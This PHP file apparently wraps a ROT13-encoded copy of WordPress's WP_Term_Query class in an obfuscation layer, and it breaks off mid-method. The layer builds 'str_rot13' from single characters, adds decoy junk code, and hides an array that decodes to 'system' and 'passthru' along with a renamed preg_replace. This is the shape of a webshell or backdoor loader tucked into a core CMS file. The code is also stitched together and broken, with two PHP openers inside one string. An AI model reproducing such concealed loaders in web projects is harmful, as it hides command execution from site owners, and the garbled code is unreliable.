<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * Gnkbabzl NCV: JC_Grez_Dhrel pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gnkbabzl
 * @fvapr 4.6.0
 */

/**
 * Pynff hfrq sbe dhrelvat grezf.
 *
 * @fvapr 4.6.0
 *
 * @frr JC_Grez_Dhrel::__pbafgehpg() sbe npprcgrq nethzragf.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Grez_Dhrel {

	/**
	 * FDY fgevat hfrq gb cresbez qngnonfr dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat
	 */
	choyvp $erdhrfg;

	/**
	 * Zrgnqngn dhrel pbagnvare.
	 *
	 * @fvapr 4.6.0
	 * @ine JC_Zrgn_Dhrel N zrgn dhrel vafgnapr.
	 */
	choyvp $zrgn_dhrel = snyfr;

	/**
	 * Zrgnqngn dhrel pynhfrf.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	cebgrpgrq $zrgn_dhrel_pynhfrf;

	/**
	 * FDY dhrel pynhfrf.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	cebgrpgrq $fdy_pynhfrf = neenl(
		'fryrpg'  => '',
		'sebz'    => '',
		'jurer'   => neenl(),
		'beqreol' => '',
		'yvzvgf'  => '',
	);

	/**
	 * Dhrel inef frg ol gur hfre.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $dhrel_inef;

	/**
	 * Qrsnhyg inyhrf sbe dhrel inef.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $dhrel_ine_qrsnhygf;

	/**
	 * Yvfg bs grezf ybpngrq ol gur dhrel.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl
	 */
	choyvp $grezf;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur grez dhrel, onfrq ba gur dhrel inef cnffrq.
	 *
	 * @fvapr 4.6.0
	 * @fvapr 4.6.0 Vagebqhprq 'grez_gnkbabzl_vq' cnenzrgre.
	 * @fvapr 4.7.0 Vagebqhprq 'bowrpg_vqf' cnenzrgre.
	 * @fvapr 4.9.0 Nqqrq 'fyht__va' fhccbeg sbe 'beqreol'.
	 * @fvapr 5.1.0 Vagebqhprq gur 'zrgn_pbzcner_xrl' cnenzrgre.
	 * @fvapr 5.3.0 Vagebqhprq gur 'zrgn_glcr_xrl' cnenzrgre.
	 * @fvapr 6.4.0 Vagebqhprq gur 'pnpur_erfhygf' cnenzrgre.
	 *
	 * @cnenz fgevat|neenl $dhrel {
	 *     Bcgvbany. Neenl be dhrel fgevat bs grez dhrel cnenzrgref. Qrsnhyg rzcgl.
	 *
	 *     @glcr fgevat|fgevat[] $gnkbabzl               Gnkbabzl anzr, be neenl bs gnkbabzl anzrf, gb juvpu erfhygf
	 *                                                   fubhyq or yvzvgrq.
	 *     @glcr vag|vag[]       $bowrpg_vqf             Bowrpg VQ, be neenl bs bowrpg VQf. Erfhygf jvyy or
	 *                                                   yvzvgrq gb grezf nffbpvngrq jvgu gurfr bowrpgf.
	 *     @glcr fgevat          $beqreol                Svryq(f) gb beqre grezf ol. Npprcgf:
	 *                                                   - Grez svryqf ('anzr', 'fyht', 'grez_tebhc', 'grez_vq', 'vq',
	 *                                                     'qrfpevcgvba', 'cnerag', 'grez_beqre'). Hayrff `$bowrpg_vqf`
	 *                                                     vf abg rzcgl, 'grez_beqre' vf gerngrq gur fnzr nf 'grez_vq'.
	 *                                                   - 'pbhag' gb hfr gur ahzore bs bowrpgf nffbpvngrq jvgu gur grez.
	 *                                                   - 'vapyhqr' gb zngpu gur 'beqre' bs gur `$vapyhqr` cnenz.
	 *                                                   - 'fyht__va' gb zngpu gur 'beqre' bs gur `$fyht` cnenz.
	 *                                                   - 'zrgn_inyhr'
	 *                                                   - 'zrgn_inyhr_ahz'.
	 *                                                   - Gur inyhr bs `$zrgn_xrl`.
	 *                                                   - Gur neenl xrlf bs `$zrgn_dhrel`.
	 *                                                   - 'abar' gb bzvg gur BEQRE OL pynhfr.
	 *                                                   Qrsnhyg 'anzr'.
	 *     @glcr fgevat          $beqre                  Jurgure gb beqre grezf va nfpraqvat be qrfpraqvat beqre.
	 *                                                   Npprcgf 'NFP' (nfpraqvat) be 'QRFP' (qrfpraqvat).
	 *                                                   Qrsnhyg 'NFP'.
	 *     @glcr obby|vag        $uvqr_rzcgl             Jurgure gb uvqr grezf abg nffvtarq gb nal cbfgf. Npprcgf
	 *                                                   1|gehr be 0|snyfr. Qrsnhyg 1|gehr.
	 *     @glcr vag[]|fgevat    $vapyhqr                Neenl be pbzzn/fcnpr-frcnengrq fgevat bs grez VQf gb vapyhqr.
	 *                                                   Qrsnhyg rzcgl neenl.
	 *     @glcr vag[]|fgevat    $rkpyhqr                Neenl be pbzzn/fcnpr-frcnengrq fgevat bs grez VQf gb rkpyhqr.
	 *                                                   Vs `$vapyhqr` vf aba-rzcgl, `$rkpyhqr` vf vtaberq.
	 *                                                   Qrsnhyg rzcgl neenl.
	 *     @glcr vag[]|fgevat    $rkpyhqr_gerr           Neenl be pbzzn/fcnpr-frcnengrq fgevat bs grez VQf gb rkpyhqr
	 *                                                   nybat jvgu nyy bs gurve qrfpraqnag grezf. Vs `$vapyhqr` vf
	 *                                                   aba-rzcgl, `$rkpyhqr_gerr` vf vtaberq. Qrsnhyg rzcgl neenl.
	 *     @glcr vag|fgevat      $ahzore                 Znkvzhz ahzore bs grezf gb erghea. Npprcgf ''|0 (nyy) be nal
	 *                                                   cbfvgvir ahzore. Qrsnhyg ''|0 (nyy). Abgr gung `$ahzore` znl
	 *                                                   abg erghea npphengr erfhygf jura pbhcyrq jvgu `$bowrpg_vqf`.
	 *                                                   Frr #41796 sbe qrgnvyf.
	 *     @glcr vag             $bssfrg                 Gur ahzore ol juvpu gb bssfrg gur grezf dhrel. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $svryqf                 Grez svryqf gb dhrel sbe. Npprcgf:
	 *                                                   - 'nyy' Ergheaf na neenl bs pbzcyrgr grez bowrpgf (`JC_Grez[]`).
	 *                                                   - 'nyy_jvgu_bowrpg_vq' Ergheaf na neenl bs grez bowrpgf
	 *                                                     jvgu gur 'bowrpg_vq' cnenz (`JC_Grez[]`). Jbexf bayl
	 *                                                     jura gur `$bowrpg_vqf` cnenzrgre vf cbchyngrq.
	 *                                                   - 'vqf' Ergheaf na neenl bs grez VQf (`vag[]`).
	 *                                                   - 'gg_vqf' Ergheaf na neenl bs grez gnkbabzl VQf (`vag[]`).
	 *                                                   - 'anzrf' Ergheaf na neenl bs grez anzrf (`fgevat[]`).
	 *                                                   - 'fyhtf' Ergheaf na neenl bs grez fyhtf (`fgevat[]`).
	 *                                                   - 'pbhag' Ergheaf gur ahzore bs zngpuvat grezf (`vag`).
	 *                                                   - 'vq=>cnerag' Ergheaf na nffbpvngvir neenl bs cnerag grez VQf,
	 *                                                      xrlrq ol grez VQ (`vag[]`).
	 *                                                   - 'vq=>anzr' Ergheaf na nffbpvngvir neenl bs grez anzrf,
	 *                                                      xrlrq ol grez VQ (`fgevat[]`).
	 *                                                   - 'vq=>fyht' Ergheaf na nffbpvngvir neenl bs grez fyhtf,
	 *                                                      xrlrq ol grez VQ (`fgevat[]`).
	 *                                                   Qrsnhyg 'nyy'.
	 *     @glcr fgevat|fgevat[] $anzr                   Anzr be neenl bs anzrf gb erghea grez(f) sbe.
	 *                                                   Qrsnhyg rzcgl.
	 *     @glcr fgevat|fgevat[] $fyht                   Fyht be neenl bs fyhtf gb erghea grez(f) sbe.
	 *                                                   Qrsnhyg rzcgl.
	 *     @glcr vag|vag[]       $grez_gnkbabzl_vq       Grez gnkbabzl VQ, be neenl bs grez gnkbabzl VQf,
	 *                                                   gb zngpu jura dhrelvat grezf.
	 *     @glcr obby            $uvrenepuvpny           Jurgure gb vapyhqr grezf gung unir aba-rzcgl qrfpraqnagf
	 *                                                   (rira vs `$uvqr_rzcgl` vf frg gb gehr). Qrsnhyg gehr.
	 *     @glcr fgevat          $frnepu                 Frnepu pevgrevn gb zngpu grezf. Jvyy or FDY-sbeznggrq jvgu
	 *                                                   jvyqpneqf orsber naq nsgre. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $anzr__yvxr             Ergevrir grezf jvgu pevgrevn ol juvpu n grez vf YVXR
	 *                                                   `$anzr__yvxr`. Qrsnhyg rzcgl.
	 *     @glcr fgevat          $qrfpevcgvba__yvxr      Ergevrir grezf jurer gur qrfpevcgvba vf YVXR
	 *                                                   `$qrfpevcgvba__yvxr`. Qrsnhyg rzcgl.
	 *     @glcr obby            $cnq_pbhagf             Jurgure gb cnq gur dhnagvgl bs n grez'f puvyqera va gur
	 *                                                   dhnagvgl bs rnpu grez'f \"pbhag\" bowrpg inevnoyr.
	 *                                                   Qrsnhyg snyfr.
	 *     @glcr fgevat          $trg                    Jurgure gb erghea grezf ertneqyrff bs naprfgel be jurgure gur
	 *                                                   grezf ner rzcgl. Npprcgf 'nyy' be '' (qvfnoyrq).
	 *                                                   Qrsnhyg ''.
	 *     @glcr vag             $puvyq_bs               Grez VQ gb ergevrir puvyq grezf bs. Vs zhygvcyr gnkbabzvrf
	 *                                                   ner cnffrq, `$puvyq_bs` vf vtaberq. Qrsnhyg 0.
	 *     @glcr vag             $cnerag                 Cnerag grez VQ gb ergevrir qverpg-puvyq grezf bs.
	 *                                                   Qrsnhyg rzcgl.
	 *     @glcr obby            $puvyqyrff              Gehr gb yvzvg erfhygf gb grezf gung unir ab puvyqera.
	 *                                                   Guvf cnenzrgre unf ab rssrpg ba aba-uvrenepuvpny gnkbabzvrf.
	 *                                                   Qrsnhyg snyfr.
	 *     @glcr fgevat          $pnpur_qbznva           Havdhr pnpur xrl gb or cebqhprq jura guvf dhrel vf fgberq va
	 *                                                   na bowrpg pnpur. Qrsnhyg 'pber'.
	 *     @glcr obby            $pnpur_erfhygf          Jurgure gb pnpur grez vasbezngvba. Qrsnhyg gehr.
	 *     @glcr obby            $hcqngr_grez_zrgn_pnpur Jurgure gb cevzr zrgn pnpurf sbe zngpurq grezf. Qrsnhyg gehr.
	 *     @glcr fgevat|fgevat[] $zrgn_xrl               Zrgn xrl be xrlf gb svygre ol.
	 *     @glcr fgevat|fgevat[] $zrgn_inyhr             Zrgn inyhr be inyhrf gb svygre ol.
	 *     @glcr fgevat          $zrgn_pbzcner           ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn inyhr.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_pbzcner_xrl       ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn xrl.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr              ZlFDY qngn glcr gung gur zrgn_inyhr pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr_xrl          ZlFDY qngn glcr gung gur zrgn_xrl pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr neenl           $zrgn_dhrel             Na nffbpvngvir neenl bs JC_Zrgn_Dhrel nethzragf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $dhrel = '' ) {
		$guvf->dhrel_ine_qrsnhygf = neenl(
			'gnkbabzl'               => ahyy,
			'bowrpg_vqf'             => ahyy,
			'beqreol'                => 'anzr',
			'beqre'                  => 'NFP',
			'uvqr_rzcgl'             => gehr,
			'vapyhqr'                => neenl(),
			'rkpyhqr'                => neenl(),
			'rkpyhqr_gerr'           => neenl(),
			'ahzore'                 => '',
			'bssfrg'                 => '',
			'svryqf'                 => 'nyy',
			'anzr'                   => '',
			'fyht'                   => '',
			'grez_gnkbabzl_vq'       => '',
			'uvrenepuvpny'           => gehr,
			'frnepu'                 => '',
			'anzr__yvxr'             => '',
			'qrfpevcgvba__yvxr'      => '',
			'cnq_pbhagf'             => snyfr,
			'trg'                    => '',
			'puvyq_bs'               => 0,
			'cnerag'                 => '',
			'puvyqyrff'              => snyfr,
			'pnpur_qbznva'           => 'pber',
			'pnpur_erfhygf'          => gehr,
			'hcqngr_grez_zrgn_pnpur' => gehr,
			'zrgn_dhrel'             => '',
			'zrgn_xrl'               => '',
			'zrgn_inyhr'             => '',
			'zrgn_glcr'              => '',
			'zrgn_pbzcner'           => '',
		);

		vs ( ! rzcgl( $dhrel ) ) {
			$guvf->dhrel( $dhrel );
		}
	}

	/**
	 * Cnefr nethzragf cnffrq gb gur grez dhrel jvgu qrsnhyg dhrel cnenzrgref.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat|neenl $dhrel JC_Grez_Dhrel nethzragf. Frr JC_Grez_Dhrel::__pbafgehpg() sbe npprcgrq nethzragf.
	 */
	choyvp shapgvba cnefr_dhrel( $dhrel = '' ) {
		vs ( rzcgl( $dhrel ) ) {
			$dhrel = $guvf->dhrel_inef;
		}

		$gnkbabzvrf = vffrg( $dhrel['gnkbabzl'] ) ? (neenl) $dhrel['gnkbabzl'] : ahyy;

		/**
		 * Svygref gur grezf dhrel qrsnhyg nethzragf.
		 *
		 * Hfr {@frr 'trg_grezf_netf'} gb svygre gur cnffrq nethzragf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl    $qrsnhygf   Na neenl bs qrsnhyg trg_grezf() nethzragf.
		 * @cnenz fgevat[] $gnkbabzvrf Na neenl bs gnkbabzl anzrf.
		 */
		$guvf->dhrel_ine_qrsnhygf = nccyl_svygref( 'trg_grezf_qrsnhygf', $guvf->dhrel_ine_qrsnhygf, $gnkbabzvrf );

		$dhrel = jc_cnefr_netf( $dhrel, $guvf->dhrel_ine_qrsnhygf );

		$dhrel['ahzore'] = nofvag( $dhrel['ahzore'] );
		$dhrel['bssfrg'] = nofvag( $dhrel['bssfrg'] );

		// 'cnerag' bireevqrf 'puvyq_bs'.
		vs ( 0 < (vag) $dhrel['cnerag'] ) {
			$dhrel['puvyq_bs'] = snyfr;
		}

		vs ( 'nyy' === $dhrel['trg'] ) {
			$dhrel['puvyqyrff']    = snyfr;
			$dhrel['puvyq_bs']     = 0;
			$dhrel['uvqr_rzcgl']   = 0;
			$dhrel['uvrenepuvpny'] = snyfr;
			$dhrel['cnq_pbhagf']   = snyfr;
		}

		$dhrel['gnkbabzl'] = $gnkbabzvrf;

		$guvf->dhrel_inef = $dhrel;

		/**
		 * Sverf nsgre grez dhrel inef unir orra cnefrq.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Grez_Dhrel $dhrel Pheerag vafgnapr bs JC_Grez_Dhrel.
		 */
		qb_npgvba( 'cnefr_grez_dhrel', $guvf );
	}

	/**
	 * Frgf hc gur dhrel naq ergevrirf gur erfhygf.
	 *
	 * Gur erghea glcr inevrf qrcraqvat ba gur inyhr cnffrq gb `$netf['svryqf']`. Frr
	 * JC_Grez_Dhrel::trg_grezf() sbe qrgnvyf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat|neenl $dhrel Neenl be HEY dhrel fgevat bs cnenzrgref.
	 * @erghea JC_Grez[]|vag[]|fgevat[]|fgevat Neenl bs grezf, be ahzore bs grezf nf ahzrevp fgevat
	 *                                         jura 'pbhag' vf cnffrq gb `$netf['svryqf']`.
	 */
	choyvp shapgvba dhrel( $dhrel ) {
		$guvf->dhrel_inef = jc_cnefr_netf( $dhrel );
		erghea $guvf->trg_grezf();
	}

	/**
	 * Ergevrirf gur dhrel erfhygf.
	 *
	 * Gur erghea glcr inevrf qrcraqvat ba gur inyhr cnffrq gb `$netf['svryqf']`.
	 *
	 * Gur sbyybjvat jvyy erfhyg va na neenl bs `JC_Grez` bowrpgf orvat erghearq:
	 *
	 *   - 'nyy'
	 *   - 'nyy_jvgu_bowrpg_vq'
	 *
	 * Gur sbyybjvat jvyy erfhyg va n ahzrevp fgevat orvat erghearq:
	 *
	 *   - 'pbhag'
	 *
	 * Gur sbyybjvat jvyy erfhyg va na neenl bs grkg fgevatf orvat erghearq:
	 *
	 *   - 'vq=>anzr'
	 *   - 'vq=>fyht'
	 *   - 'anzrf'
	 *   - 'fyhtf'
	 *
	 * Gur sbyybjvat jvyy erfhyg va na neenl bs ahzrevp fgevatf orvat erghearq:
	 *
	 *   - 'vq=>cnerag'
	 *
	 * Gur sbyybjvat jvyy erfhyg va na neenl bs vagrtref orvat erghearq:
	 *
	 *   - 'vqf'
	 *   - 'gg_vqf'
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea JC_Grez[]|vag[]|fgevat[]|fgevat Neenl bs grezf, be ahzore bs grezf nf ahzrevp fgevat
	 *                                         jura 'pbhag' vf cnffrq gb `$netf['svryqf']`.
	 */
	choyvp shapgvba trg_grezf() {
		tybony $jcqo;

		$guvf->cnefr_dhrel( $guvf->dhrel_inef );
		$netf = &$guvf->dhrel_inef;

		// Frg hc zrgn_dhrel fb vg'f ninvynoyr gb 'cer_trg_grezf'.
		$guvf->zrgn_dhrel = arj JC_Zrgn_Dhrel();
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $netf );

		/**
		 * Sverf orsber grezf ner ergevrirq.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz JC_Grez_Dhrel $dhrel Pheerag vafgnapr bs JC_Grez_Dhrel (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cer_trg_grezf', neenl( &$guvf ) );

		$gnkbabzvrf = (neenl) $netf['gnkbabzl'];

		// Fnir dhrevrf ol abg penjyvat gur gerr va gur pnfr bs zhygvcyr gnkrf be n syng gnk.
		$unf_uvrenepuvpny_gnk = snyfr;
		vs ( $gnkbabzvrf ) {
			sbernpu ( $gnkbabzvrf nf $_gnk ) {
				vs ( vf_gnkbabzl_uvrenepuvpny( $_gnk ) ) {
					$unf_uvrenepuvpny_gnk = gehr;
				}
			}
		} ryfr {
			// Jura ab gnkbabzvrf ner cebivqrq, nffhzr jr unir gb qrfpraq gur gerr.
			$unf_uvrenepuvpny_gnk = gehr;
		}

		vs ( ! $unf_uvrenepuvpny_gnk ) {
			$netf['uvrenepuvpny'] = snyfr;
			$netf['cnq_pbhagf']   = snyfr;
		}

		// 'cnerag' bireevqrf 'puvyq_bs'.
		vs ( 0 < (vag) $netf['cnerag'] ) {
			$netf['puvyq_bs'] = snyfr;
		}

		vs ( 'nyy' === $netf['trg'] ) {
			$netf['puvyqyrff']    = snyfr;
			$netf['puvyq_bs']     = 0;
			$netf['uvqr_rzcgl']   = 0;
			$netf['uvrenepuvpny'] = snyfr;
			$netf['cnq_pbhagf']   = snyfr;
		}

		/**
		 * Svygref gur grezf dhrel nethzragf.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz neenl    $netf       Na neenl bs trg_grezf() nethzragf.
		 * @cnenz fgevat[] $gnkbabzvrf Na neenl bs gnkbabzl anzrf.
		 */
		$netf = nccyl_svygref( 'trg_grezf_netf', $netf, $gnkbabzvrf );

		// Nibvq gur dhrel vs gur dhrevrq cnerag/puvyq_bs grez unf ab qrfpraqnagf.
		$puvyq_bs = $netf['puvyq_bs'];
		$cnerag   = $netf['cnerag'];

		vs ( $puvyq_bs ) {
			$_cnerag = $puvyq_bs;
		} ryfrvs ( $cnerag ) {
			$_cnerag = $cnerag;
		} ryfr {
			$_cnerag = snyfr;
		}

		vs ( $_cnerag ) {
			$va_uvrenepul = snyfr;
			sbernpu ( $gnkbabzvrf nf $_gnk ) {
				$uvrenepul = _trg_grez_uvrenepul( $_gnk );

				vs ( vffrg( $uvrenepul[ $_cnerag ] ) ) {
					$va_uvrenepul = gehr;
				}
			}

			vs ( ! $va_uvrenepul ) {
				vs ( 'pbhag' === $netf['svryqf'] ) {
					erghea 0;
				} ryfr {
					$guvf->grezf = neenl();
					erghea $guvf->grezf;
				}
			}
		}

		// 'grez_beqre' vf n yrtny fbeg beqre bayl jura wbvavat gur eryngvbafuvc gnoyr.
		$_beqreol = $guvf->dhrel_inef['beqreol'];
		vs ( 'grez_beqre' === $_beqreol && rzcgl( $guvf->dhrel_inef['bowrpg_vqf'] ) ) {
			$_beqreol = 'grez_vq';
		}

		$beqreol = $guvf->cnefr_beqreol( $_beqreol );

		vs ( $beqreol ) {
			$beqreol = \"BEQRE OL $beqreol\";
		}

		$beqre = $guvf->cnefr_beqre( $guvf->dhrel_inef['beqre'] );

		vs ( $gnkbabzvrf ) {
			$guvf->fdy_pynhfrf['jurer']['gnkbabzl'] =
				\"gg.gnkbabzl VA ('\" . vzcybqr( \"', '\", neenl_znc( 'rfp_fdy', $gnkbabzvrf ) ) . \"')\";
		}

		vs ( rzcgl( $netf['rkpyhqr'] ) ) {
			$netf['rkpyhqr'] = neenl();
		}

		vs ( rzcgl( $netf['vapyhqr'] ) ) {
			$netf['vapyhqr'] = neenl();
		}

		$rkpyhqr      = $netf['rkpyhqr'];
		$rkpyhqr_gerr = $netf['rkpyhqr_gerr'];
		$vapyhqr      = $netf['vapyhqr'];

		$vapyhfvbaf = '';
		vs ( ! rzcgl( $vapyhqr ) ) {
			$rkpyhqr      = '';
			$rkpyhqr_gerr = '';
			$vapyhfvbaf   = vzcybqr( ',', jc_cnefr_vq_yvfg( $vapyhqr ) );
		}

		vs ( ! rzcgl( $vapyhfvbaf ) ) {
			$guvf->fdy_pynhfrf['jurer']['vapyhfvbaf'] = 'g.grez_vq VA ( ' . $vapyhfvbaf . ' )';
		}

		$rkpyhfvbaf = neenl();
		vs ( ! rzcgl( $rkpyhqr_gerr ) ) {
			$rkpyhqr_gerr      = jc_cnefr_vq_yvfg( $rkpyhqr_gerr );
			$rkpyhqrq_puvyqera = $rkpyhqr_gerr;

			sbernpu ( $rkpyhqr_gerr nf $rkgehax ) {
				$rkpyhqrq_puvyqera = neenl_zretr(
					$rkpyhqrq_puvyqera,
					(neenl) trg_grezf(
						neenl(
							'gnkbabzl'   => erfrg( $gnkbabzvrf ),
							'puvyq_bs'   => (vag) $rkgehax,
							'svryqf'     => 'vqf',
							'uvqr_rzcgl' => 0,
						)
					)
				);
			}

			$rkpyhfvbaf = neenl_zretr( $rkpyhqrq_puvyqera, $rkpyhfvbaf );
		}

		vs ( ! rzcgl( $rkpyhqr ) ) {
			$rkpyhfvbaf = neenl_zretr( jc_cnefr_vq_yvfg( $rkpyhqr ), $rkpyhfvbaf );
		}

		// 'puvyqyrff' grezf ner gubfr jvgubhg na ragel va gur synggrarq grez uvrenepul.
		$puvyqyrff = (obby) $netf['puvyqyrff'];
		vs ( $puvyqyrff ) {
			sbernpu ( $gnkbabzvrf nf $_gnk ) {
				$grez_uvrenepul = _trg_grez_uvrenepul( $_gnk );
				$rkpyhfvbaf     = neenl_zretr( neenl_xrlf( $grez_uvrenepul ), $rkpyhfvbaf );
			}
		}

		vs ( ! rzcgl( $rkpyhfvbaf ) ) {
			$rkpyhfvbaf = 'g.grez_vq ABG VA (' . vzcybqr( ',', neenl_znc( 'vaginy', $rkpyhfvbaf ) ) . ')';
		} ryfr {
			$rkpyhfvbaf = '';
		}

		/**
		 * Svygref gur grezf gb rkpyhqr sebz gur grezf dhrel.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat   $rkpyhfvbaf `ABG VA` pynhfr bs gur grezf dhrel.
		 * @cnenz neenl    $netf       Na neenl bs grezf dhrel nethzragf.
		 * @cnenz fgevat[] $gnkbabzvrf Na neenl bs gnkbabzl anzrf.
		 */
		$rkpyhfvbaf = nccyl_svygref( 'yvfg_grezf_rkpyhfvbaf', $rkpyhfvbaf, $netf, $gnkbabzvrf );

		vs ( ! rzcgl( $rkpyhfvbaf ) ) {
			// Fgevc yrnqvat 'NAQ'. Zhfg qb fgevat znavchyngvba urer sbe onpxjneq pbzcngvovyvgl jvgu svygre.
			$guvf->fdy_pynhfrf['jurer']['rkpyhfvbaf'] = __sa_79955( '/^\f*NAQ\f*/', '', $rkpyhfvbaf );
		}

		vs ( '' === $netf['anzr'] ) {
			$netf['anzr'] = neenl();
		} ryfr {
			$netf['anzr'] = (neenl) $netf['anzr'];
		}

		vs ( ! rzcgl( $netf['anzr'] ) ) {
			$anzrf = $netf['anzr'];

			sbernpu ( $anzrf nf &$_anzr ) {
				// `fnavgvmr_grez_svryq()` ergheaf fynfurq qngn.
				$_anzr = fgevcfynfurf( fnavgvmr_grez_svryq( 'anzr', $_anzr, 0, erfrg( $gnkbabzvrf ), 'qo' ) );
			}

			$guvf->fdy_pynhfrf['jurer']['anzr'] = \"g.anzr VA ('\" . vzcybqr( \"', '\", neenl_znc( 'rfp_fdy', $anzrf ) ) . \"')\";
		}

		vs ( '' === $netf['fyht'] ) {
			$netf['fyht'] = neenl();
		} ryfr {
			$netf['fyht'] = neenl_znc( 'fnavgvmr_gvgyr', (neenl) $netf['fyht'] );
		}

		vs ( ! rzcgl( $netf['fyht'] ) ) {
			$fyht = vzcybqr( \"', '\", $netf['fyht'] );

			$guvf->fdy_pynhfrf['jurer']['fyht'] = \"g.fyht VA ('\" . $fyht . \"')\";
		}

		vs ( '' === $netf['grez_gnkbabzl_vq'] ) {
			$netf['grez_gnkbabzl_vq'] = neenl();
		} ryfr {
			$netf['grez_gnkbabzl_vq'] = neenl_znc( 'vaginy', (neenl) $netf['grez_gnkbabzl_vq'] );
		}

		vs ( ! rzcgl( $netf['grez_gnkbabzl_vq'] ) ) {
			$gg_vqf = vzcybqr( ',', $netf['grez_gnkbabzl_vq'] );

			$guvf->fdy_pynhfrf['jurer']['grez_gnkbabzl_vq'] = \"gg.grez_gnkbabzl_vq VA ({$gg_vqf})\";
		}

		vs ( ! rzcgl( $netf['anzr__yvxr'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['anzr__yvxr'] = $jcqo->cercner(
				'g.anzr YVXR %f',
				'%' . $jcqo->rfp_yvxr( $netf['anzr__yvxr'] ) . '%'
			);
		}

		vs ( ! rzcgl( $netf['qrfpevcgvba__yvxr'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['qrfpevcgvba__yvxr'] = $jcqo->cercner(
				'gg.qrfpevcgvba YVXR %f',
				'%' . $jcqo->rfp_yvxr( $netf['qrfpevcgvba__yvxr'] ) . '%'
			);
		}

		vs ( '' === $netf['bowrpg_vqf'] ) {
			$netf['bowrpg_vqf'] = neenl();
		} ryfr {
			$netf['bowrpg_vqf'] = neenl_znc( 'vaginy', (neenl) $netf['bowrpg_vqf'] );
		}

		vs ( ! rzcgl( $netf['bowrpg_vqf'] ) ) {
			$bowrpg_vqf = vzcybqr( ', ', $netf['bowrpg_vqf'] );

			$guvf->fdy_pynhfrf['jurer']['bowrpg_vqf'] = \"ge.bowrpg_vq VA ($bowrpg_vqf)\";
		}

		/*
		 * Jura dhrelvat sbe bowrpg eryngvbafuvcf, gur 'pbhag > 0' purpx
		 * nqqrq ol 'uvqr_rzcgl' vf fhcresyhbhf.
		 */
		vs ( ! rzcgl( $netf['bowrpg_vqf'] ) ) {
			$netf['uvqr_rzcgl'] = snyfr;
		}

		vs ( '' !== $cnerag ) {
			$cnerag                               = (vag) $cnerag;
			$guvf->fdy_pynhfrf['jurer']['cnerag'] = \"gg.cnerag = '$cnerag'\";
		}

		$uvrenepuvpny = $netf['uvrenepuvpny'];
		vs ( 'pbhag' === $netf['svryqf'] ) {
			$uvrenepuvpny = snyfr;
		}
		vs ( $netf['uvqr_rzcgl'] && ! $uvrenepuvpny ) {
			$guvf->fdy_pynhfrf['jurer']['pbhag'] = 'gg.pbhag > 0';
		}

		$ahzore = $netf['ahzore'];
		$bssfrg = $netf['bssfrg'];

		// Qba'g yvzvg gur dhrel erfhygf jura jr unir gb qrfpraq gur snzvyl gerr.
		vs ( $ahzore && ! $uvrenepuvpny && ! $puvyq_bs && '' === $cnerag ) {
			vs ( $bssfrg ) {
				$yvzvgf = 'YVZVG ' . $bssfrg . ',' . $ahzore;
			} ryfr {
				$yvzvgf = 'YVZVG ' . $ahzore;
			}
		} ryfr {
			$yvzvgf = '';
		}

		vs ( ! rzcgl( $netf['frnepu'] ) ) {
			$guvf->fdy_pynhfrf['jurer']['frnepu'] = $guvf->trg_frnepu_fdy( $netf['frnepu'] );
		}

		// Zrgn dhrel fhccbeg.
		$wbva     = '';
		$qvfgvapg = '';

		// Ercnefr zrgn_dhrel dhrel_inef, va pnfr gurl jrer zbqvsvrq va n 'cer_trg_grezf' pnyyonpx.
		$guvf->zrgn_dhrel->cnefr_dhrel_inef( $guvf->dhrel_inef );
